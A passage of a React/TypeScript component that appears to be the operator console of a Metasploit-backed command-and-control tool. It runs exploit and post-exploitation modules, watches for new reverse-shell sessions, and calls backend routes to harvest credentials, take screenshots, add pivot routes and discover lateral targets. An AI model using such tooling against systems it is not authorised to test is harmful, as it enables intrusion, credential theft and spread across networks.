      if (!res.ok) { setAttackPlanError(data.detail || 'Failed to generate plan'); return }
      setAttackPlan(data)
    } catch (e: unknown) {
      setAttackPlanError(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setGeneratingAttack(false)
    }
  }

  function startSessionPolling(idx: number, knownIds: Set<string>) {
    if (sessionPollRef.current) clearInterval(sessionPollRef.current)
    const deadline = Date.now() + 60_000
    sessionPollRef.current = setInterval(async () => {
      if (!projectId) return
      await fetch(`${getApiBase()}/c2/sessions/sync?project_id=${projectId}`, { method: 'POST' })
      const res = await fetch(`${getApiBase()}/c2/sessions?project_id=${projectId}`)
      if (res.ok) {
        const data: C2Session[] = await res.json()
        setSessions(data)
        const newSession = data.find(s => !knownIds.has(s.id))
        if (newSession) {
          setModuleResults(prev => ({
            ...prev,
            [idx]: { ...prev[idx], new_session_id: newSession.msf_session_id },
          }))
          clearInterval(sessionPollRef.current!)
          sessionPollRef.current = null
          return
        }
      }
      if (Date.now() >= deadline) {
        clearInterval(sessionPollRef.current!)
        sessionPollRef.current = null
        setModuleResults(prev => ({
          ...prev,
          [idx]: { ...prev[idx], timed_out: true },
        }))
      }
    }, 3000)
  }

  async function handleRunModule(rec: AttackRec, idx: number) {
    if (!msfStatus.connected) return
    // Snapshot known session IDs BEFORE the module runs so polling can detect new ones
    const knownSessionIds = new Set(sessions.map(s => s.id))
    setRunningModule(idx)
    setModuleResults(prev => { const n = { ...prev }; delete n[idx]; return n })
    try {
      const res = await fetch(`${getApiBase()}/c2/run-module`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          module: rec.module,
          options: rec.options,
          payload: rec.payload,
          project_id: projectId,
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setModuleResults(prev => ({ ...prev, [idx]: { error: data.detail || 'Failed' } }))
      } else {
        setModuleResults(prev => ({ ...prev, [idx]: data }))
        await handleSync()
        // Pure scanners never create sessions — skip polling to avoid false positives
        const _noSession = ['auxiliary/scanner/smtp', 'auxiliary/scanner/nfs', 'auxiliary/scanner/ssl']
        const _isPureScanner = _noSession.some(p => rec.module.startsWith(p))
        // Keep polling for 60s in case reverse shell stages slowly; update card when found
        if (!data.new_session_id && !_isPureScanner) startSessionPolling(idx, knownSessionIds)
      }
    } catch (e: unknown) {
      setModuleResults(prev => ({ ...prev, [idx]: { error: e instanceof Error ? e.message : 'Unknown error' } }))
    } finally {
      setRunningModule(null)
    }
  }

  async function handleRunPostModule(mod: PostModule) {
    if (!activeSession) return
    const entryId = `${mod.name}-${Date.now()}`
    const entry = { id: entryId, label: mod.label, ts: new Date(), output: null, error: null, running: true }
    setPostHistory(prev => [entry, ...prev])
    setExpandedHistory(prev => new Set(prev).add(entryId))
    terminalRef.current?.writeln(`\x1b[33m[*] ${mod.label}\x1b[0m`)
    try {
      const res = await fetch(`${getApiBase()}/c2/post-modules/run`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: activeSession.id, module_name: mod.name }),
      })
      if (!res.body) throw new Error('No stream body')
      const reader = res.body.getReader()
      const decoder = new TextDecoder()
      let accumulated = ''
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        const text = decoder.decode(value, { stream: true })
        for (const raw of text.split('\n')) {
          const line = raw.startsWith('data: ') ? raw.slice(6) : raw
          if (!line) continue
          if (line === '[DONE]') break
          accumulated += (accumulated ? '\n' : '') + line
          setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, output: accumulated } : e))
          terminalRef.current?.writeln(line)
          if (line.startsWith('[+] New session')) loadSessions()
        }
      }
      setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, running: false } : e))
      loadChecklist(activeSession.id)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Unknown error'
      setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, running: false, error: msg } : e))
    }
  }

  function connectTerminal(session: C2Session) {
    wsRef.current?.close()
    const ws = new WebSocket(wsUrl(`/ws/c2/${session.id}`))
    wsRef.current = ws
    terminalRef.current?.clear()

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data)
      if (msg.type === 'stdout') terminalRef.current?.write(msg.data)
      else if (msg.type === 'stderr') terminalRef.current?.write('\x1b[31m' + msg.data + '\x1b[0m')
      else if (msg.type === 'error') terminalRef.current?.writeln(`\x1b[31m[ERROR] ${msg.data}\x1b[0m`)
    }
    ws.onerror = () => terminalRef.current?.writeln('\x1b[31m[WS ERROR]\x1b[0m')
    ws.onclose = () => terminalRef.current?.writeln('\x1b[90m\r\n[disconnected]\x1b[0m')
  }

  function sendCommand() {
    const cmd = termInput.trim()
    if (!cmd || !wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return
    wsRef.current.send(JSON.stringify({ action: 'exec', command: cmd }))
    setTermInput('')
  }

  async function loadChecklist(sessionId: string) {
    const res = await fetch(`${getApiBase()}/c2/sessions/${sessionId}/checklist`)
    if (res.ok) setChecklist(await res.json())
  }

  async function loadRoutes(sessionId: string) {
    const res = await fetch(`${getApiBase()}/c2/sessions/${sessionId}/routes`)
    if (res.ok) setPivotRoutes(await res.json())
  }

  async function toggleChecklistItem(itemId: string, done: boolean) {
    if (!activeSession) return
    const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/checklist/${itemId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ done }),
    })
    if (res.ok) setChecklist(await res.json())
  }

  async function handleHarvestCreds() {
    if (!activeSession) return
    setHarvesting(true)
    setHarvestOutput('')
    try {
      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/harvest-creds`, { method: 'POST' })
      const data = await res.json()
      if (res.ok) {
        setHarvestOutput(data.output + `\n\n[+] ${data.creds_saved} credential(s) saved to vault.`)
        loadLoot()
        loadChecklist(activeSession.id)
      } else {
        setHarvestOutput(`Error: ${data.detail || 'Harvest failed'}`)
      }
    } catch (e: unknown) {
      setHarvestOutput(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setHarvesting(false)
    }
  }

  async function handleUpgrade() {
    if (!activeSession) return
    setUpgrading(true)
    setUpgradeOutput('')
    try {
      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/upgrade`, { method: 'POST' })
      if (!res.body) throw new Error('No stream body')
      const reader = res.body.getReader()
      const decoder = new TextDecoder()
      let out = ''
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        const text = decoder.decode(value, { stream: true })
        for (const raw of text.split('\n')) {
          const line = raw.startsWith('data: ') ? raw.slice(6) : raw
          if (!line || line === '[DONE]') continue
          out += (out ? '\n' : '') + line
          setUpgradeOutput(out)
          if (line.startsWith('[+] New session')) loadSessions()
        }
      }
    } catch (e: unknown) {
      setUpgradeOutput(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setUpgrading(false)
    }
  }

  async function handleScreenshot() {
    if (!activeSession) return
    setScreenshotting(true)
    setScreenshotResult('')
    try {
      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/screenshot`, { method: 'POST' })
      const data = await res.json()
      if (res.ok) {
        setScreenshotResult(`Screenshot saved: ${data.path}`)
        loadLoot()
        loadChecklist(activeSession.id)
      } else {
        setScreenshotResult(`Error: ${data.detail || 'Screenshot failed'}`)
      }
    } catch (e: unknown) {
      setScreenshotResult(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setScreenshotting(false)
    }
  }

  async function handleAddRoute() {
    if (!activeSession || !newRouteSubnet) return
    setAddingRoute(true)
    try {
      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/routes`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ subnet: newRouteSubnet, netmask: newRouteNetmask }),
      })
      if (res.ok) {
        setPivotRoutes(await res.json())
        setNewRouteSubnet('')
      }
    } finally {
      setAddingRoute(false)
    }
  }

  async function handleRemoveRoute(routeId: string) {
    if (!activeSession) return
    const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/routes/${routeId}`, { method: 'DELETE' })
    if (res.ok) setPivotRoutes(await res.json())
  }

  async function handleAutoprobe() {
    if (!activeSession) return
    setProbing(true)
    setProbeOutput('Running auto-probe… (this may take up to 90s)')
    const sid = activeSession.id
    const startedAt = new Date().toISOString()
    await fetch(`${getApiBase()}/c2/sessions/${sid}/auto-probe`, { method: 'POST' })
    // Probe runs as a background task (5 commands × up to 15s each = ~75s worst case).
    // Poll every 8s; once the system_info loot entry appears, surface it here.
    let ticks = 0
    const poll = setInterval(async () => {
      ticks++
      const res = await fetch(`${getApiBase()}/c2/loot?project_id=${projectId}`)
      if (res.ok) {
        const entries: LootEntry[] = await res.json()
        setLoot(entries)
        const probeEntry = entries.find(
          e => e.loot_type === 'system_info' && e.session_id === sid &&
               e.captured_at >= startedAt
        )
        if (probeEntry) {
          setProbeOutput(probeEntry.content + '\n\n[+] Saved to Loot tab.')
          clearInterval(poll)
          setProbing(false)
          await loadChecklist(sid)
          return
        }
      }
      if (ticks >= 11) {  // 11 × 8s = 88s
        clearInterval(poll)
        setProbing(false)
        setProbeOutput('Auto-probe timed out — check Loot tab for results.')
      }
    }, 8000)
  }

  async function handleLateralDiscover() {
    if (!activeSession) return
    setDiscoveringLateral(true)
    try {
      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/lateral-discover`, { method: 'POST' })
      if (res.ok) setLateralResult(await res.json())
    } finally {
      setDiscoveringLateral(false)
    }
  }

  async function handleParseSysinfo() {
    if (!activeSession || !sysinfoRaw.trim()) return
    setParsingSysinfo(true)
    try {
      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/sysinfo`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ raw_output: sysinfoRaw }),
      })
      if (res.ok) {
        // Refresh session list so sysinfo panel updates
        const sesRes = await fetch(`${getApiBase()}/c2/sessions?project_id=${projectId}`)
        if (sesRes.ok) {
          const updated: C2Session[] = await sesRes.json()
          setSessions(updated)
          const refreshed = updated.find(s => s.id === activeSession.id)
          if (refreshed) setActiveSession(refreshed)
        }
        setSysinfoRaw('')
      }
    } finally {
      setParsingSysinfo(false)
    }
  }

  function copyText(text: string, key: string) {
    navigator.clipboard.writeText(text)
    setCopied(key)
    setTimeout(() => setCopied(''), 2000)
  }

  const LOOT_STYLES: Record<string, { color: string; border: string; background: string }> = {
    credential: { color: 'var(--accent)',  border: '1px solid rgba(240,168,58,0.3)', background: 'rgba(240,168,58,0.08)' },
    hash:       { color: 'var(--crit)',    border: '1px solid rgba(232,64,64,0.3)',  background: 'rgba(232,64,64,0.08)' },
    file:       { color: 'var(--med)',      border: '1px solid rgba(180,130,60,0.3)',  background: 'rgba(180,130,60,0.08)' },
    key:        { color: '#a78bfa',        border: '1px solid rgba(167,139,250,0.3)', background: 'rgba(167,139,250,0.08)' },
    secret:     { color: '#fb923c',        border: '1px solid rgba(251,146,60,0.3)', background: 'rgba(251,146,60,0.08)' },
    system_info:{ color: 'var(--accent)',  border: '1px solid rgba(240,168,58,0.3)', background: 'rgba(240,168,58,0.06)' },
  }

  const inputClass: React.CSSProperties = { border: ruleStrong, borderRadius: 4, padding: '8px 12px', fontSize: 13, outline: 'none', width: '100%', background: 'var(--bg)', color: 'var(--fg)', fontFamily: 'var(--font-sans)', boxSizing: 'border-box' }

  return (
    <div style={{ display: 'flex', height: '100%', gap: 16, overflow: 'hidden' }}>
      {/* Left panel */}
      <div style={{ width: 288, flexShrink: 0, display: 'flex', flexDirection: 'column', gap: 12, minHeight: 0 }}>

        {/* MSF Connection status */}
        <div style={{ background: 'var(--bg-2)', border: msfStatus.connected ? '1px solid rgba(84,175,97,0.2)' : '1px solid rgba(232,64,64,0.2)', borderRadius: 4, padding: 16 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
            {msfStatus.connected
              ? <Icon name="wifi" size={16} style={{ color: 'var(--ok)' }} />
              : <Icon name="wifi" size={16} style={{ color: 'var(--crit)' }} />
            }
            <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg-2)' }}>Metasploit RPC</span>
            {msfStatus.connected && (
              <span style={{ marginLeft: 'auto', fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--ok)' }}>v{msfStatus.version}</span>
            )}
          </div>

          {msfStatus.connected ? (
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
              <div style={{ borderRadius: 4, padding: 8, textAlign: 'center', border: ruleStrong }}>
                <div style={{ fontSize: 20, fontWeight: 700, fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>{msfStatus.sessions}</div>
                <div style={{ fontSize: 10, color: 'var(--fg-3)' }}>Sessions</div>
              </div>
              <div style={{ borderRadius: 4, padding: 8, textAlign: 'center', border: ruleStrong }}>
                <div style={{ fontSize: 20, fontWeight: 700, fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>{msfStatus.jobs}</div>
                <div style={{ fontSize: 10, color: 'var(--fg-3)' }}>Jobs</div>
              </div>
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                <div>
                  <label style={{ fontSize: 10, color: 'var(--fg-3)', display: 'block', marginBottom: 4 }}>Host</label>
                  <input value={msfHost} onChange={e => setMsfHost(e.target.value)} style={inputClass} placeholder="127.0.0.1" />
                </div>
                <div>
                  <label style={{ fontSize: 10, color: 'var(--fg-3)', display: 'block', marginBottom: 4 }}>Port</label>
                  <input value={msfPort} onChange={e => setMsfPort(e.target.value)} style={inputClass} placeholder="55553" />
                </div>
              </div>
              <div>
                <label style={{ fontSize: 10, color: 'var(--fg-3)', display: 'block', marginBottom: 4 }}>Password</label>
                <input type="password" value={msfPass} onChange={e => setMsfPass(e.target.value)} style={inputClass} placeholder="msfrpcd password" />
              </div>
              {connectError && <p style={{ fontSize: 11, color: 'var(--crit)' }}>{connectError}</p>}
              <button
                onClick={handleConnect}
                disabled={connecting}
                style={{ width: '100%', padding: '8px 0', borderRadius: 4, border: 'none', fontSize: 13, fontWeight: 500, cursor: connecting ? 'not-allowed' : 'pointer', opacity: connecting ? 0.5 : 1, background: 'var(--accent)', color: '#0d0c0a', fontFamily: 'var(--font-sans)' }}
              >
                {connecting ? 'Connecting...' : 'Connect to MSF'}
              </button>
            </div>
          )}
        </div>

        {/* Session list */}
        <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0, overflow: 'hidden' }}>
          <div style={{ padding: '12px 16px', borderBottom: rule, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Sessions</span>
            <button onClick={handleSync} disabled={loading || !msfStatus.connected} title="Sync from MSF" style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 4, opacity: (loading || !msfStatus.connected) ? 0.4 : 1 }}>
              <Icon name="refresh" size={13} className={loading ? 'animate-spin' : ''} />
            </button>
          </div>
          <div style={{ overflowY: 'auto', flex: 1 }}>
            {sessions.length === 0 ? (
              <div style={{ textAlign: 'center', color: 'var(--fg-4)', padding: '32px 16px', fontSize: 11 }}>
                <Icon name="shield" size={28} style={{ margin: '0 auto 8px', opacity: 0.2 }} />
                No sessions yet. Sync from MSF or add manually.
              </div>
            ) : sessions.map(s => (
              <div
                key={s.id}
                onClick={() => setActiveSession(s)}
                style={{
                  display: 'flex', alignItems: 'flex-start', gap: 12, padding: '12px 16px', cursor: 'pointer',
                  borderBottom: rule, borderLeft: activeSession?.id === s.id ? '2px solid var(--accent)' : '2px solid transparent',
                  background: activeSession?.id === s.id ? 'rgba(240,168,58,0.05)' : 'none',
                }}
              >
                <Icon name="terminal" size={14} style={{ marginTop: 2, flexShrink: 0, color: s.status === 'active' && s.live ? 'var(--ok)' : s.status === 'lost' ? 'var(--crit)' : 'var(--fg-4)' }} />
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8 }}>
                    <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                      {s.remote_host || 'unknown'}
                      {s.msf_session_id && <span style={{ color: 'var(--fg-4)', marginLeft: 4 }}>#{s.msf_session_id}</span>}
                    </span>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      <SessionStatusBadge status={s.status} live={s.live} />
                      <button
                        onClick={e => { e.stopPropagation(); handleKillSession(s) }}
                        style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}
                        title="Kill & delete session"
                      >
                        <Icon name="x" size={12} />
                      </button>
                    </div>
                  </div>
                  <div style={{ fontSize: 10, color: 'var(--fg-3)', marginTop: 2 }}>{s.session_type} · {s.platform || '?'} · {s.arch || '?'}</div>
                  {s.via_exploit && <div style={{ fontSize: 10, color: 'var(--fg-4)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.via_exploit}</div>}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Main panel */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0, minHeight: 0 }}>
        {/* Tabs */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12, flexShrink: 0 }}>
          <div style={{ display: 'flex', borderBottom: rule }}>
            {([
              { id: 'sessions', icon: <Icon name="terminal" size={13} />, label: 'Console' },
              { id: 'payloads', icon: <Icon name="layers" size={13} />, label: 'Payloads' },
              { id: 'listeners', icon: <Icon name="radio" size={13} />, label: 'Listeners' },
              { id: 'attack', icon: <Icon name="target" size={13} />, label: 'Attack Plan' },
              { id: 'loot', icon: <Icon name="layers" size={13} />, label: `Loot (${loot.length})` },
              { id: 'postex', icon: <Icon name="check" size={13} />, label: 'Post-Ex' },
              { id: 'lotl', icon: <Icon name="book" size={13} />, label: 'LOTL' },
              { id: 'infra', icon: <Icon name="layers" size={13} />, label: 'Infrastructure' },
            ] as const).map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                style={{
                  display: 'flex', alignItems: 'center', gap: 6, padding: '8px 14px', fontSize: 12, fontWeight: 500,
                  background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'var(--font-sans)',
                  borderBottom: activeTab === tab.id ? '2px solid var(--accent)' : '2px solid transparent',
                  marginBottom: -1,
                  color: activeTab === tab.id ? 'var(--accent)' : 'var(--fg-3)',
                }}
              >
                {tab.icon} {tab.label}
              </button>
            ))}
          </div>
          {activeSession && (
            <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: 8, fontSize: 11 }}>
              <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>
                {activeSession.remote_host}:{activeSession.remote_port}
              </span>
              <span style={{ color: 'var(--fg-4)' }}>·</span>
              <span style={{ color: 'var(--fg-3)' }}>{activeSession.session_type}</span>
              <button onClick={() => handleKillSession(activeSession)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0, marginLeft: 8 }} title="Kill session">
                <Icon name="x" size={14} />
              </button>
            </div>
          )}
        </div>

        {/* Console tab */}
        {activeTab === 'sessions' && (
          <div style={{ flex: 1, display: 'flex', gap: 12, minHeight: 0 }}>
            {/* Terminal */}
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0 }}>
              {activeSession ? (
                <>
                  <Terminal ref={terminalRef} style={{ flex: 1, borderRadius: 4, overflow: 'hidden', border: ruleStrong }} />
                  {/* Command input */}
                  <div style={{ display: 'flex', gap: 8, marginTop: 8, flexShrink: 0 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, flex: 1, background: 'var(--bg-2)', borderRadius: 4, padding: '8px 12px', border: ruleStrong }}>
                      <span style={{ color: 'var(--ok)', fontFamily: 'var(--font-mono)', fontSize: 11, flexShrink: 0 }}>seraph@c2 &gt;</span>
                      <input
                        ref={inputRef}
                        value={termInput}
                        onChange={e => setTermInput(e.target.value)}
                        onKeyDown={e => { if (e.key === 'Enter') sendCommand() }}
                        placeholder="Enter command..."
                        style={{ flex: 1, background: 'transparent', fontSize: 13, color: 'var(--fg)', outline: 'none', fontFamily: 'var(--font-mono)', border: 'none' }}
                        autoFocus
                      />
                    </div>
                    <button onClick={sendCommand} style={{ padding: '0 12px', borderRadius: 4, background: 'var(--accent)', border: 'none', cursor: 'pointer', color: '#0d0c0a', flexShrink: 0 }}>
                      <Icon name="chev_r" size={16} />
                    </button>
                  </div>
                </>
              ) : (
                <div style={{ flex: 1, background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: 'var(--fg-4)' }}>
                  <Icon name="terminal" size={40} style={{ marginBottom: 12, opacity: 0.2 }} />
                  <p style={{ fontSize: 13 }}>Select a session from the left to open a console</p>
                  <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>or sync active sessions from Metasploit</p>
                </div>
              )}
            </div>

            {/* Post-exploitation sidebar */}
            {activeSession && (
              <div style={{ width: 256, flexShrink: 0, display: 'flex', flexDirection: 'column', gap: 8, minHeight: 0 }}>
                {/* Sysinfo panel */}
                {activeSession.sysinfo && (
                  <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden', flexShrink: 0 }}>
                    <div style={{ padding: '8px 12px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', display: 'flex', alignItems: 'center', gap: 6 }}>
                        <Icon name="shield" size={10} style={{ color: 'var(--accent)' }} /> Host Info
                      </span>
                      {activeSession.sysinfo.is_admin && (
                        <span style={{ fontSize: 10, fontWeight: 700, color: '#fbbf24', background: 'rgba(251,191,36,0.1)', padding: '1px 6px', borderRadius: 3 }}>ADMIN</span>
                      )}
                    </div>
                    <div style={{ padding: 8, display: 'flex', flexDirection: 'column', gap: 4, fontSize: 11, fontFamily: 'var(--font-mono)' }}>
                      {activeSession.sysinfo.hostname && (
                        <div style={{ display: 'flex', gap: 6 }}>
                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>hostname</span>
                          <span style={{ color: 'var(--accent)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{activeSession.sysinfo.hostname}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.os && (
                        <div style={{ display: 'flex', gap: 6 }}>
                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>os</span>
                          <span style={{ color: 'var(--fg-2)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={activeSession.sysinfo.os}>{activeSession.sysinfo.os}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.arch && (
                        <div style={{ display: 'flex', gap: 6 }}>
                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>arch</span>
                          <span style={{ color: 'var(--fg-2)' }}>{activeSession.sysinfo.arch}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.username && (
                        <div style={{ display: 'flex', gap: 6 }}>
                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>user</span>
                          <span style={{ color: 'var(--ok)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={activeSession.sysinfo.username}>{activeSession.sysinfo.username}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.domain && (
                        <div style={{ display: 'flex', gap: 6 }}>
                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>domain</span>
                          <span style={{ color: '#a78bfa', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{activeSession.sysinfo.domain}</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}
                {/* Module buttons */}
                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden', display: 'flex', flexDirection: 'column', maxHeight: 240 }}>
                  <div style={{ padding: '8px 12px', borderBottom: rule, flexShrink: 0 }}>
                    <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Post Modules</span>
                  </div>
                  <div style={{ overflowY: 'auto', padding: 8, display: 'flex', flexDirection: 'column', gap: 4 }}>
                    {postModules.map(mod => {
                      const isRunning = postHistory.some(e => e.label === mod.label && e.running)
                      return (
                        <button
                          key={mod.name}
                          onClick={() => handleRunPostModule(mod)}
                          disabled={isRunning}
                          title={mod.description}
                          style={{ width: '100%', textAlign: 'left', padding: '8px 12px', borderRadius: 4, fontSize: 11, color: 'var(--fg-2)', background: 'none', border: ruleStrong, cursor: isRunning ? 'not-allowed' : 'pointer', display: 'flex', alignItems: 'center', gap: 8, opacity: isRunning ? 0.5 : 1, fontFamily: 'var(--font-sans)' }}
                        >
                          {isRunning
                            ? <Icon name="refresh" size={11} style={{ color: 'var(--accent)', flexShrink: 0 }} className="animate-spin" />
                            : <Icon name="bolt" size={11} style={{ color: 'var(--fg-4)', flexShrink: 0 }} />}
                          <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{mod.label}</span>
                        </button>
                      )
                    })}
                  </div>
                </div>

                {/* Run history */}
                {postHistory.length > 0 && (
                  <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden', display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}>
                    <div style={{ padding: '8px 12px', borderBottom: rule, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Results</span>
                      <button onClick={() => setPostHistory([])} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }} title="Clear history">
                        <Icon name="x" size={11} />
                      </button>
                    </div>
                    <div style={{ overflowY: 'auto', flex: 1 }}>
                      {postHistory.map(entry => (
                        <div key={entry.id} style={{ fontSize: 11, borderBottom: rule }}>
                          <button
                            onClick={() => setExpandedHistory(prev => {
                              const n = new Set(prev)
                              n.has(entry.id) ? n.delete(entry.id) : n.add(entry.id)
                              return n
                            })}
                            style={{ width: '100%', display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px', background: 'none', border: 'none', cursor: 'pointer', textAlign: 'left' }}
                          >
                            {entry.running
                              ? <Icon name="refresh" size={10} style={{ color: 'var(--accent)', flexShrink: 0 }} className="animate-spin" />
                              : entry.error
                                ? <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--crit)', flexShrink: 0 }} />
                                : <span style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--ok)', flexShrink: 0 }} />}
                            <span style={{ flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', color: 'var(--fg-2)' }}>{entry.label}</span>
                            <span style={{ color: 'var(--fg-4)', flexShrink: 0 }}>{entry.ts.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>
                          </button>
                          {expandedHistory.has(entry.id) && (
                            <div style={{ padding: '0 12px 8px', display: 'flex', flexDirection: 'column', gap: 8 }}>
                              {(() => {
                                const leads = entry.output
                                  ? entry.output.split('\n').filter(l => l.startsWith('[+]'))
                                  : []
                                return leads.length > 0 && !entry.running ? (
                                  <div style={{ borderRadius: 4, border: '1px solid rgba(84,175,97,0.3)', background: 'rgba(84,175,97,0.06)', padding: 8, display: 'flex', flexDirection: 'column', gap: 4 }}>
                                    <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--ok)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 4 }}>
                                      {leads.length} Lead{leads.length !== 1 ? 's' : ''}
                                    </div>
                                    {leads.map((l, i) => {
                                      const match = l.match(/exploit\/[\w/]+/)
                                      const module = match ? match[0] : null
                                      const desc = l.replace(/\[\+\]\s*[\d.]+\s*-\s*(exploit\/[\w/]+)?\s*:?\s*/, '').trim()
                                      return (
                                        <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 6 }}>
                                          <span style={{ color: 'var(--ok)', flexShrink: 0, marginTop: 2 }}>›</span>
                                          <div style={{ minWidth: 0 }}>
                                            {module && (
                                              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                                                <span style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--ok)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{module}</span>
                                                <button
                                                  onClick={() => { navigator.clipboard.writeText(module); setCopied(module) }}
                                                  style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0, flexShrink: 0 }}
                                                  title="Copy module path"
                                                >
                                                  {copied === module ? <span style={{ fontSize: 9, color: 'var(--ok)' }}>✓</span> : <Icon name="copy" size={9} />}
                                                </button>
                                              </div>
                                            )}
                                            <span style={{ fontSize: 9, color: 'var(--fg-3)' }}>{desc}</span>
                                          </div>
                                        </div>
                                      )
                                    })}
                                  </div>
                                ) : null
                              })()}
                              {entry.running
                                ? <span style={{ color: 'var(--fg-3)', fontStyle: 'italic' }}>Running…</span>
                                : entry.error
